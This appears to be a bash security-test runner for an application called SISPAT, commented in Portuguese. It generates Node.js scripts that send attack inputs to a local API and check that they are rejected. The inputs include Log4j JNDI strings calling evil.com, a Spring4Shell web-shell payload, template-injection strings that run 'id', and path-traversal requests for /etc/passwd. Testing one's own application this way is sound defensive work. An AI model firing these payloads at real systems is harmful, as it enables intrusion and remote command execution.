#!/bin/bash

# SISPAT - Script Principal de Testes de Segurança
# Este script executa todos os testes de segurança: básicos, avançados, vulnerabilidades e penetração

set -e

echo "🚀 Executando Todos os Testes de Segurança do SISPAT..."

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Função para log
log() {
    echo -e "${GREEN}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"
}

warn() {
    echo -e "${YELLOW}[$(date +'%Y-%m-%d %H:%M:%S')] WARNING:${NC} $1"
}

error() {
    echo -e "${RED}[$(date +'%Y-%m-%d %H:%M:%S')] ERROR:${NC} $1"
}

# Configurações
BASE_URL=${1:-"http://localhost:3001"}
TEST_RESULTS_DIR="/var/log/sispat/all-security-tests"
DATE=$(date +%Y%m%d_%H%M%S)

# Criar diretório de resultados
mkdir -p $TEST_RESULTS_DIR

# 1. Verificar pré-requisitos
log "Verificando pré-requisitos..."

# Verificar se o Node.js está instalado
if ! command -v node &> /dev/null; then
    error "Node.js não está instalado"
    exit 1
fi

# Verificar se o npm está instalado
if ! command -v npm &> /dev/null; then
    error "NPM não está instalado"
    exit 1
fi

# Verificar se o axios está instalado
if ! npm list axios &> /dev/null; then
    log "Instalando axios..."
    npm install axios
fi

# Verificar se o jq está instalado
if ! command -v jq &> /dev/null; then
    log "Instalando jq..."
    apt update && apt install -y jq
fi

# Verificar se o bc está instalado
if ! command -v bc &> /dev/null; then
    log "Instalando bc..."
    apt update && apt install -y bc
fi

log "✅ Pré-requisitos verificados"

# 2. Executar testes de segurança básicos
log "Executando testes de segurança básicos..."
if [ -f "scripts/run-security-tests.sh" ]; then
    chmod +x scripts/run-security-tests.sh
    ./scripts/run-security-tests.sh $BASE_URL
    
    # Copiar resultados
    if [ -d "/var/log/sispat/security-tests" ]; then
        cp -r /var/log/sispat/security-tests/* $TEST_RESULTS_DIR/
    fi
    
    log "✅ Testes de segurança básicos concluídos"
else
    warn "⚠️ Script de testes de segurança básicos não encontrado"
fi

# 3. Executar testes de segurança avançados
log "Executando testes de segurança avançados..."
if [ -f "scripts/run-advanced-security-tests.sh" ]; then
    chmod +x scripts/run-advanced-security-tests.sh
    ./scripts/run-advanced-security-tests.sh $BASE_URL
    
    # Copiar resultados
    if [ -d "/var/log/sispat/advanced-security-tests" ]; then
        cp -r /var/log/sispat/advanced-security-tests/* $TEST_RESULTS_DIR/
    fi
    
    log "✅ Testes de segurança avançados concluídos"
else
    warn "⚠️ Script de testes de segurança avançados não encontrado"
fi

# 4. Executar testes de vulnerabilidades específicas
log "Executando testes de vulnerabilidades específicas..."

# Criar script de teste de vulnerabilidades específicas
tee /tmp/specific_vulnerabilities.js > /dev/null << 'EOF'
const axios = require('axios');

async function testSpecificVulnerabilities() {
    const baseUrl = process.env.BASE_URL || 'http://localhost:3001';
    const results = {
        tests: [],
        passed: 0,
        failed: 0
    };

    // Teste 1: Log4j Vulnerability
    try {
        const log4jPayloads = [
            '${jndi:ldap://evil.com/a}',
            '${jndi:rmi://evil.com/a}',
            '${jndi:dns://evil.com/a}',
            '${jndi:corba://evil.com/a}',
            '${jndi:nds://evil.com/a}'
        ];
        
        let log4jBlocked = 0;
        for (const payload of log4jPayloads) {
            try {
                await axios.post(`${baseUrl}/api/auth/login`, {
                    email: payload,
                    password: 'test'
                });
            } catch (error) {
                if (error.response && error.response.status === 401) {
                    log4jBlocked++;
                }
            }
        }
        
        if (log4jBlocked === log4jPayloads.length) {
            results.tests.push({ name: 'Log4j Vulnerability', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'Log4j Vulnerability', status: 'FAIL', error: 'Possível vulnerabilidade Log4j' });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'Log4j Vulnerability', status: 'FAIL', error: error.message });
        results.failed++;
    }

    // Teste 2: Spring4Shell Vulnerability
    try {
        const spring4shellPayloads = [
            'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=',
            'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di'
        ];
        
        let spring4shellBlocked = 0;
        for (const payload of spring4shellPayloads) {
            try {
                await axios.post(`${baseUrl}/api/auth/login`, {
                    email: payload,
                    password: 'test'
                });
            } catch (error) {
                if (error.response && error.response.status === 401) {
                    spring4shellBlocked++;
                }
            }
        }
        
        if (spring4shellBlocked === spring4shellPayloads.length) {
            results.tests.push({ name: 'Spring4Shell Vulnerability', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'Spring4Shell Vulnerability', status: 'FAIL', error: 'Possível vulnerabilidade Spring4Shell' });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'Spring4Shell Vulnerability', status: 'FAIL', error: error.message });
        results.failed++;
    }

    // Teste 3: Deserialization Vulnerability
    try {
        const deserializationPayloads = [
            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdGVzdHQABHRlc3R4eA==',
            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdGVzdHQABHRlc3R4eA=='
        ];
        
        let deserializationBlocked = 0;
        for (const payload of deserializationPayloads) {
            try {
                await axios.post(`${baseUrl}/api/auth/login`, {
                    email: payload,
                    password: 'test'
                });
            } catch (error) {
                if (error.response && error.response.status === 401) {
                    deserializationBlocked++;
                }
            }
        }
        
        if (deserializationBlocked === deserializationPayloads.length) {
            results.tests.push({ name: 'Deserialization Vulnerability', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'Deserialization Vulnerability', status: 'FAIL', error: 'Possível vulnerabilidade de deserialização' });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'Deserialization Vulnerability', status: 'FAIL', error: error.message });
        results.failed++;
    }

    // Teste 4: Template Injection
    try {
        const templatePayloads = [
            '{{7*7}}',
            '{{config}}',
            '{{self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}',
            '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}'
        ];
        
        let templateBlocked = 0;
        for (const payload of templatePayloads) {
            try {
                await axios.post(`${baseUrl}/api/auth/login`, {
                    email: payload,
                    password: 'test'
                });
            } catch (error) {
                if (error.response && error.response.status === 401) {
                    templateBlocked++;
                }
            }
        }
        
        if (templateBlocked === templatePayloads.length) {
            results.tests.push({ name: 'Template Injection', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'Template Injection', status: 'FAIL', error: 'Possível vulnerabilidade de injeção de template' });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'Template Injection', status: 'FAIL', error: error.message });
        results.failed++;
    }

    // Teste 5: Path Traversal
    try {
        const pathTraversalPayloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%2f..%2f..%2fetc%2fpasswd'
        ];
        
        let pathTraversalBlocked = 0;
        for (const payload of pathTraversalPayloads) {
            try {
                await axios.get(`${baseUrl}/api/patrimonios/${payload}`);
            } catch (error) {
                if (error.response && (error.response.status === 400 || error.response.status === 404)) {
                    pathTraversalBlocked++;
                }
            }
        }
        
        if (pathTraversalBlocked === pathTraversalPayloads.length) {
            results.tests.push({ name: 'Path Traversal', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'Path Traversal', status: 'FAIL', error: 'Possível vulnerabilidade de path traversal' });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'Path Traversal', status: 'FAIL', error: error.message });
        results.failed++;
    }

    return results;
}

testSpecificVulnerabilities().then(results => {
    console.log(JSON.stringify(results, null, 2));
}).catch(error => {
    console.error('Erro nos testes de vulnerabilidades específicas:', error);
    process.exit(1);
});
EOF

# Executar testes de vulnerabilidades específicas
SPEC_VULN_RESULTS=$(node /tmp/specific_vulnerabilities.js)
echo "$SPEC_VULN_RESULTS" > $TEST_RESULTS_DIR/specific_vulnerabilities_$DATE.json

# Verificar resultados
SPEC_VULN_PASSED=$(echo "$SPEC_VULN_RESULTS" | jq -r '.passed')
SPEC_VULN_FAILED=$(echo "$SPEC_VULN_RESULTS" | jq -r '.failed')

if [ $SPEC_VULN_FAILED -eq 0 ]; then
    log "✅ Testes de vulnerabilidades específicas: $SPEC_VULN_PASSED/$((SPEC_VULN_PASSED + SPEC_VULN_FAILED)) passaram"
else
    warn "⚠️ Testes de vulnerabilidades específicas: $SPEC_VULN_FAILED falharam"
fi

# 5. Executar testes de segurança de rede
log "Executando testes de segurança de rede..."

# Criar script de teste de segurança de rede
tee /tmp/network_security.js > /dev/null << 'EOF'
const axios = require('axios');

async function testNetworkSecurity() {
    const baseUrl = process.env.BASE_URL || 'http://localhost:3001';
    const results = {
        tests: [],
        passed: 0,
        failed: 0
    };

    // Teste 1: HTTPS Enforcement
    try {
        const response = await axios.get(`${baseUrl}/api/health`);
        
        if (response.status === 200) {
            results.tests.push({ name: 'HTTPS Enforcement', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'HTTPS Enforcement', status: 'FAIL', error: 'HTTPS não está sendo aplicado' });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'HTTPS Enforcement', status: 'FAIL', error: error.message });
        results.failed++;
    }

    // Teste 2: Security Headers
    try {
        const response = await axios.get(`${baseUrl}/api/health`);
        const headers = response.headers;
        
        const securityHeaders = [
            'x-frame-options',
            'x-content-type-options',
            'x-xss-protection',
            'referrer-policy',
            'content-security-policy',
            'strict-transport-security'
        ];
        
        let securityHeadersPresent = 0;
        for (const header of securityHeaders) {
            if (headers[header]) {
                securityHeadersPresent++;
            }
        }
        
        if (securityHeadersPresent >= 4) {
            results.tests.push({ name: 'Security Headers', status: 'PASS', count: securityHeadersPresent });
            results.passed++;
        } else {
            results.tests.push({ name: 'Security Headers', status: 'FAIL', error: `Apenas ${securityHeadersPresent} headers encontrados` });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'Security Headers', status: 'FAIL', error: error.message });
        results.failed++;
    }

    // Teste 3: CORS Configuration
    try {
        const response = await axios.get(`${baseUrl}/api/health`, {
            headers: {
                'Origin': 'http://malicious-site.com',
                'Access-Control-Request-Method': 'GET'
            }
        });
        
        const corsHeaders = response.headers;
        if (corsHeaders['access-control-allow-origin']) {
            results.tests.push({ name: 'CORS Configuration', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'CORS Configuration', status: 'FAIL', error: 'Headers CORS não configurados' });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'CORS Configuration', status: 'FAIL', error: error.message });
        results.failed++;
    }

    // Teste 4: Rate Limiting
    try {
        const promises = [];
        for (let i = 0; i < 100; i++) {
            promises.push(axios.get(`${baseUrl}/api/health`).catch(error => error));
        }
        
        const responses = await Promise.all(promises);
        const rateLimited = responses.some(response => 
            response.response && response.response.status === 429
        );
        
        if (rateLimited) {
            results.tests.push({ name: 'Rate Limiting', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'Rate Limiting', status: 'FAIL', error: 'Rate limiting não funcionando' });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'Rate Limiting', status: 'FAIL', error: error.message });
        results.failed++;
    }

    // Teste 5: Information Disclosure
    try {
        const response = await axios.get(`${baseUrl}/api/health`);
        
        // Verificar se informações sensíveis não são expostas
        const responseText = JSON.stringify(response.data);
        const sensitiveInfo = ['password', 'secret', 'key', 'token', 'private', 'internal'];
        
        let sensitiveInfoFound = 0;
        for (const info of sensitiveInfo) {
            if (responseText.toLowerCase().includes(info)) {
                sensitiveInfoFound++;
            }
        }
        
        if (sensitiveInfoFound === 0) {
            results.tests.push({ name: 'Information Disclosure', status: 'PASS' });
            results.passed++;
        } else {
            results.tests.push({ name: 'Information Disclosure', status: 'FAIL', error: 'Informações sensíveis podem estar expostas' });
            results.failed++;
        }
    } catch (error) {
        results.tests.push({ name: 'Information Disclosure', status: 'FAIL', error: error.message });
        results.failed++;
    }

    return results;
}

testNetworkSecurity().then(results => {
    console.log(JSON.stringify(results, null, 2));
}).catch(error => {
    console.error('Erro nos testes de segurança de rede:', error);
    process.exit(1);
});
EOF

# Executar testes de segurança de rede
NET_SEC_RESULTS=$(node /tmp/network_security.js)
echo "$NET_SEC_RESULTS" > $TEST_RESULTS_DIR/network_security_$DATE.json

# Verificar resultados
NET_SEC_PASSED=$(echo "$NET_SEC_RESULTS" | jq -r '.passed')
NET_SEC_FAILED=$(echo "$NET_SEC_RESULTS" | jq -r '.failed')

if [ $NET_SEC_FAILED -eq 0 ]; then
    log "✅ Testes de segurança de rede: $NET_SEC_PASSED/$((NET_SEC_PASSED + NET_SEC_FAILED)) passaram"
else
    warn "⚠️ Testes de segurança de rede: $NET_SEC_FAILED falharam"
fi

# 6. Gerar relatório consolidado final
log "Gerando relatório consolidado final..."

# Calcular totais
TOTAL_SEC_PASSED=$((SPEC_VULN_PASSED + NET_SEC_PASSED))
TOTAL_SEC_FAILED=$((SPEC_VULN_FAILED + NET_SEC_FAILED))
TOTAL_SEC_TESTS=$((TOTAL_SEC_PASSED + TOTAL_SEC_FAILED))

# Gerar relatório final
cat > $TEST_RESULTS_DIR/final_security_report_$DATE.json << EOF
{
  "timestamp": "$(date -Iseconds)",
  "type": "all_security_tests",
  "summary": {
    "total_tests": $TOTAL_SEC_TESTS,
    "passed": $TOTAL_SEC_PASSED,
    "failed": $TOTAL_SEC_FAILED,
    "success_rate": "$(echo "scale=2; $TOTAL_SEC_PASSED * 100 / $TOTAL_SEC_TESTS" | bc)%"
  },
  "categories": {
    "specific_vulnerabilities": {
      "passed": $SPEC_VULN_PASSED,
      "failed": $SPEC_VULN_FAILED,
      "success_rate": "$(echo "scale=2; $SPEC_VULN_PASSED * 100 / ($SPEC_VULN_PASSED + $SPEC_VULN_FAILED)" | bc)%"
    },
    "network_security": {
      "passed": $NET_SEC_PASSED,
      "failed": $NET_SEC_FAILED,
      "success_rate": "$(echo "scale=2; $NET_SEC_PASSED * 100 / ($NET_SEC_PASSED + $NET_SEC_FAILED)" | bc)%"
    }
  },
  "files": {
    "specific_vulnerabilities": "specific_vulnerabilities_$DATE.json",
    "network_security": "network_security_$DATE.json"
  }
}
EOF

# 7. Limpar arquivos temporários
log "Limpando arquivos temporários..."
rm -f /tmp/*_vulnerabilities.js /tmp/*_security.js

# 8. Exibir resumo final
log "🎉 Todos os testes de segurança finalizados!"
log "📊 Resumo dos resultados:"
log "   • Total de testes: $TOTAL_SEC_TESTS"
log "   • Testes passaram: $TOTAL_SEC_PASSED"
log "   • Testes falharam: $TOTAL_SEC_FAILED"
log "   • Taxa de sucesso: $(echo "scale=2; $TOTAL_SEC_PASSED * 100 / $TOTAL_SEC_TESTS" | bc)%"
log ""
log "📋 Resultados por categoria:"
log "   • Vulnerabilidades Específicas: $SPEC_VULN_PASSED/$((SPEC_VULN_PASSED + SPEC_VULN_FAILED)) ($(echo "scale=2; $SPEC_VULN_PASSED * 100 / ($SPEC_VULN_PASSED + $SPEC_VULN_FAILED)" | bc)%)"
log "   • Segurança de Rede: $NET_SEC_PASSED/$((NET_SEC_PASSED + NET_SEC_FAILED)) ($(echo "scale=2; $NET_SEC_PASSED * 100 / ($NET_SEC_PASSED + $NET_SEC_FAILED)" | bc)%)"
log ""
log "📁 Relatórios salvos em: $TEST_RESULTS_DIR"
log "   • Relatório final: final_security_report_$DATE.json"
log "   • Testes individuais: specific_vulnerabilities_$DATE.json, network_security_$DATE.json, etc."

if [ $TOTAL_SEC_FAILED -eq 0 ]; then
    log "✅ Todos os testes de segurança passaram! Sistema está seguro para produção."
else
    warn "⚠️ $TOTAL_SEC_FAILED testes de segurança falharam. Revise os relatórios para correções."
fi
